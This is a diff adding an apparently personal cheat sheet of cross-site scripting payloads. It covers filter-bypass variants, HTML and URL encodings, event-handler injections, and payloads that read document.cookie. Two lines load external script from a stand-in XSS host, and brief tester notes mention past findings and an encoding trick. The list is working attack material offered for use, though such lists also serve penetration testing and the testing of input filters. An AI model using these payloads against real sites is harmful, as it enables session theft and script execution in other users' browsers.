@@ -1,0 +1,145 @@
+
+```shell
+
+ <script type ='text/javascript'>';alert(1)///script>
+ onfocus=JaVaSCript:alert(123) autofocus
+" onclick="prompt(1)
+" onfocus=JaVaSCript:alert(123) autofocus
+"'//<script//confirm()</script//   <should work
+";alert(123);t="
+";prompt(1);//
+"><img src=a onerror=prompt(document.domain)>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+"><img src=x onerror=prompt``>
+"><img title="test-xss" onmouseup="confirm(document.domain)">
+"><script>alert(123);</script x="
+"><script>alert(123)</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg/onload=alert(/XSS/)
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"onload="prompt(document.domain)"
+%26%23x003C;script%26%23x003E;alert(1)%26%23x003C;/script%26%23x003E;
+%27%20onclick=%27prompt(document.domain);//
+%27;alert(document.domain);//
+%3C%3CSCRIPT%3Eprompt%28%29%3C%3CSCRIPT%3E
+%3Cimg%20src%3da%20onerror%3dalert(document.cookie)%3E
+&#60;img&#32src;&#61;x&#32;onerror&#61;alert&#40;123&#41;&#47;&#62;
+&#62;&#34;&#60;img&#32src= onload=prompt()/&#62
+&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
+&url=javascript%3Aprompt(document.domain)
+' onfocus=JaVaSCript:alert(123) autofocus
+'"></script><script>alert(document.domain)</script>
+'"><img src="x" onerror="prompt(1)">;//111
+'"><img src=a onerror=prompt(document.domain)>;//
+'"><script>alert(123)</script>
+'*alert(1)*' 
+'*prompt(123)*'
+';alert('derp');//
+';alert(123);t='
+';alert(document.domain)//
+';alert(document.domain);//
+';confirm();//
+'><script>alert(123);</script x='
+'><script>alert(123)</script>
+'accessKey='X' onclick='prompt(document.domain)
+'alert(document.domain)'//
+'blah<asd onwheel=confirm(document.domain)>blah.html'    - upload via linux 
+'onmouseover='alert(1)'
+--><script>alert(123)</script>
+.aspx?protocol="><a onwheel=alert()>
+// Div payload
+// Img payload
+// Svg payload
+/?">onmouseenter="prompt(document.domain)"
+/adam<img src=a onerror=alert(document.domain)>.jspx
+/asdf%3Cimg%20src=a%20onerror=prompt(document.domain)%3E.jspx
+/repository/<img src=a onerror=prompt(document.domain)>/forms
+1E%27-prompt(1)-%27%3A450083%3Anull
+4234"></object><img src=a onerror=prompt(document.domain)>
+;alert(123);
+< / script >< script >alert(123)< / script >
+</script><script>alert(123)</script>
+</textarea>%27%20onclick=%27prompt("derp");//
+</textarea><script>alert("XSS")</script>
+</textarea><script>alert(123)</script>
+<<//scriptscript><
+<><img src=1 onerror=alert(1)>
+<><img src=1 onerror=alert(1)> 
+<IMG SRC=# onerror="alert(1)">
+<body onpageshow="prompt(123)">
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerover="alert(45)">MOVE HERE</div>
+<h1>Inject XSS<img src=a onerror=prompt(document.domain)>
+<i onwheel=alert(1)> Scroll over me </i>
+<iframe src="javascript:alert(1)">
+<img src="a" onerror="prompt("derp")">
+<img src=a onerror=alert(document.cookie)>
+<img src=a onmouseover=confirm(123)>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert(123) />
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
+<sc<script>ript>alert(123)</sc</script>ript>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<script src="https://derp.xss.ht"></script>
+<script>\u0061lert('22')</script>
+<script>alert(1)</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
+<script>prompt(document.cookie)<%2Fscript>
+<script>prompt(document.cookie)<%2Fscript>sadf
+<svg <svg><values=&#106;avascript:alert(1) /><a id=x><rect width=50 height=50 /></a>
+<svg id=alert(1) onload=eval(id)>
+<svg onload=alert(1)// - 
+<svg xmlns="http://www.w3.org/2000/svg" onload=”alert(document.domain)”/>
+<svg/onload=alert('XSS')> -
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+<svg><script>123<1>alert(123)</script>
+<svg><script>alert&lpar;'33'&rpar;
+<svgonload=alert(1)>
+<u oncopy=alert()> Copy me</u>
+====  Base64 ========================================
+==============================================================
+===========OTHERS ================================
+=javascript:alert%26%23X28%3Bdocument.domain%26%23X29%3B
+><script>alert(123);</script x=
+><script>alert(123)</script>
+@XSS<script>alert(document.domain)</script>
+Demo"><h1/oncut=prompt()>Demo</h1>  ...  once it repaints.. cut it, get execution  : Herman's latest in NTP
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+JavaSCript:alert(123)
+Last weeks Finding in HFPP-TTP: in free-form text area
+Using  < > 
+\";alert('XSS');//
+asd';alert(document.domain);//asfd
+asdf");alert(document.domain);//
+asdf%27*/prompt(1)%3B/*
+asdf%3Cimg%20src=a%20onerror=prompt(1)%3E%27-prompt(1)-%27
+asdfsdf<details/open on/ontoggle ='confirm(document.domain)'>asdfasdf   5/20/22 adam
+asfd<script>prompt(document.cookie)<%2Fscript>
+derp <script>$.getScript("//derp.xss.htt")</script>
+http://"><img src=a onerror=prompt(document.domain)>
+https://www.aswsec.com%27;alert(document.domain);//
+javascript%3Aprompt(document.domain)
+javascript:prompt(document.domain)
+once you encode to base64 you have to change instances of + to - and you need to change instances of = to !
+pdf"><h1/onmouseenter=prompt(document.domain)>asdf
+sdf'"><details/open on/ontoggle ='confirm(document.domain)'>;//asdfasdf
+sdf<script>prompt(document.cookie)<%2Fscript>asdf
+src=JaVaSCript:prompt(132)
+uid is null <img src=a onerror=prompt(document.domain)> ismemberof is null
+＜script＞alert(123)＜/script＞
+
+
+
+
+
+
+
+
+```
